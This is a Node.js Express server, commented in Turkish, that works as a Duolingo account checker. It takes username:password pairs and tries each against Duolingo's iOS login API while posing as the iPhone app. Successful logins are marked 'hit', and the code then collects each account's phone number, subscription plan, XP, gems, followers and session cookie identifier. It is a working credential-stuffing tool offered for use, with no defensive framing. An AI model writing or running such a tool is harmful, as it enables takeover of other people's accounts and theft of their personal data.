// server.js
const express = require('express');
const axios = require('axios');
const crypto = require('crypto');

const app = express();
app.use(express.json());

// ==============================
// Duolingo performCheck fonksiyonu
// ==============================
async function performCheckDuolingo(username, password) {
  const distinctId = crypto.randomUUID();

  try {
    const response = await axios.post(
      "https://ios-api-2.duolingo.com/2023-05-23/login",
      {
        password: password,
        distinctId: distinctId,
        identifier: username,
        fields: "username,productId,level,phoneNumber,totalXp,gems,num_followers,renewing,tier,currentCourse"
      },
      {
        headers: {
          "Host": "ios-api-2.duolingo.com",
          "Accept": "*/*",
          "Content-Type": "application/json",
          "X-Amzn-Trace-Id": "User=0",
          "Accept-Encoding": "gzip, deflate, br",
          "User-Agent": "DuolingoMobile/7.41.0 (iPhone; iOS 18.0; Scale/2.00)",
          "Accept-Language": "en-IQ;q=1.0,ar-IQ;q=0.9,ckb-IQ;q=0.8"
        },
        validateStatus: () => true
      }
    );

    const source = JSON.stringify(response.data);
    const cookies = response.headers['set-cookie'] || [];
    const cookieStr = cookies.join('; ');

    const captured = {};

    // KEYCHECK Failure
    if (source.trim() === "{}") {
      return { status: 'bad', captured };
    }

    // KEYCHECK Success
    if (source.includes('"currentCourse":') && cookieStr.includes('jwt_token')) {
      captured["İsim"] = response.data.username || null;

      const productId = response.data?.shopItems?.[0]?.subscriptionInfo?.productId;
      captured["Plan type"] = translatePlan(productId);

      if (response.data.level) captured["Seviye"] = response.data.level + " Seviye";
      if (response.data.phoneNumber) captured["Telefon"] = response.data.phoneNumber;
      if (response.data.totalXp) captured["Toplam XP"] = response.data.totalXp + " XP";
      if (response.data.gems) captured["Toplam Elmas"] = response.data.gems + " Elmas";
      if (response.data.num_followers) captured["Takipçi"] = response.data.num_followers + " Takipçi";

      const renewing = response.data?.shopItems?.[0]?.subscriptionInfo?.renewing;
      captured["Auto renew"] = renewing ? "YES" : "NO";

      const tier = response.data?.shopItems?.[0]?.subscriptionInfo?.tier;
      if (tier === "one_month") captured["Period of Plan"] = "1 month";

      // Cookie'den wuuid parse
      const wuuidCookie = cookies.find(c => c.startsWith("wuuid="));
      if (wuuidCookie) {
        captured["wuuid"] = wuuidCookie.split("=")[1].split(";")[0];
      }

      return { status: 'hit', captured };
    }

    // KEYCHECK Custom FREE
    const typeVal = response.data?.shopItems?.[0]?.subscriptionInfo?.type;
    if (typeVal && !typeVal.includes("premium")) {
      return { status: 'custom', label: 'FREE', captured };
    }

    return { status: 'bad', captured };

  } catch (err) {
    return { status: 'failure', error: err.message, captured: {} };
  }
}

function translatePlan(productId) {
  switch (productId) {
    case "com.duolingo.DuolingoMobile.subscription.Premium.TwelveMonth.24":
      return "Mobile Plan";
    case "com.duolingo.immersive_free_trial_family_subscription":
      return "Family Plan";
    case "super.2ndwbt7.12m.24q47dft.8399":
    case "super.wbt7.12m.24q47dft.8399":
      return "Super Plan";
    default:
      return productId || null;
  }
}

// ==============================
// API Endpoint
// ==============================
app.get('/check', async (req, res) => {
  const account = req.query.account;
  if (!account || !account.includes(':')) {
    return res.status(400).json({ error: 'Format: user:pass' });
  }

  const [username, password] = account.split(':');

  const result = await performCheckDuolingo(username, password);

  res.json({
    account,
    result: result.status,
    label: result.label || null,
    captured: result.captured || {}
  });
});

// ==============================
// Server başlat
// ==============================
app.listen(3000, () => {
  console.log('✅ Duolingo API çalışıyor: http://localhost:3000/check?account=user:pass');
});
